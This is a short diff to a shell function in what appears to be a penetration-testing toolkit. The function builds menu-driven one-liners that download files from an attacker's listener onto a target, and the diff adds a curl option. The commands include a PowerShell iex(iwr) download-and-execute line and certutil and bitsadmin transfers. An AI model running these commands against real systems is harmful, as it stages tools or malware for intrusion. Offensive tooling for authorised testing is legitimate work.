@@ -90,8 +90,9 @@ nb-srv-file-download() {
     echo "2.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
     echo "3.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\<FILE_NAME>"
     echo "4.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-    echo "5.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\<FILE_NAME>"
-    echo "6.  Previous menu"
+    echo "5.  curl http://${__LHOST}:${__LPORT}/$filename -O $filename"
+    echo "6.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\<FILE_NAME>"
+    echo "7.  Previous menu"
     echo
     echo -n "Choice: "
     read choice
@@ -101,8 +102,9 @@ nb-srv-file-download() {
         2) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
         3) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
         4) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
-        5) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename";;
-        6) exit;;
+        5) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename -O $filename";;
+        6) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename";;
+        7) exit;;
         *) echo "Invalid option";;
     esac
 
